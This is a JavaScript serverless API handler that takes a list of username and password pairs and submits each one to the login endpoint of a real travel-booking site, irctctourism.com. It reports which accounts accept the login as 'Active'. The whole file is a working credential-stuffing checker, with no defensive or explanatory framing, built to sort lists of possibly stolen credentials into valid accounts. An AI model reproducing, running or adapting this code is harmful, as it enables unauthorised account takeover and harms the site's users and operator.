export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).send("Method Not Allowed");

  const { credentials } = req.body;
  const results = [];

  for (const { username, password } of credentials) {
    const encoded = Buffer.from(`${username}:${password}`).toString("base64");

    try {
      const response = await fetch("https://www.irctctourism.com/NewUserlogin/user/loginForIv4", {
        method: "POST",
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0"
        },
        body: JSON.stringify({ data: encoded }),
      });

      const data = await response.json();

      if (data.status === "SUCCESS") {
        results.push({ username, status: "✅ Active" });
      } else {
        results.push({ username, status: "❌ Inactive" });
      }
    } catch (error) {
      results.push({ username, status: "❌ Error" });
    }
  }

  return res.status(200).json(results);
}
